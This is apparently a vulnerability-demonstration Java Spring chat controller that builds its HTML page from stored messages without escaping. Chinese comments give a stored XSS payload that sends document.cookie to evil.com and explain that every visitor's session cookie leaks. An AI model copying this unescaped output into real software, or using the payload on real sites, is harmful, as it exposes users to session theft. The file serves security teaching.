package com.example.chat;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;

@Controller
public class ChatController {
    private static final List<String> messages = new ArrayList<>();

    @GetMapping("/chat")
    public @ResponseBody String showChat() {
        StringBuilder html = new StringBuilder("<html><body><h1>Chat Messages</h1>");
        messages.forEach(msg -> html.append("<div>").append(msg).append("</div>"));
        html.append("<form method=POST action=/chat><input name=message><button>Send</button></form></body></html>");
        return html.toString();
    }

    @PostMapping("/chat")
    public String sendChat(@RequestParam String message) {
        processMessage(message, msg -> messages.add(msg));
        return "redirect:/chat";
    }

    private void processMessage(String input, Consumer<String> handler) {
        handler.accept(input);
    }

    public static void main(String[] args) {
        // 模拟启动代码
    }
}

// 漏洞利用示例：
// 输入内容: <script>document.write('<img src="http://evil.com/steal?cookie='+document.cookie+'">')</script>
// 所有访问/chat页面的用户都会执行该脚本，导致会话Cookie泄露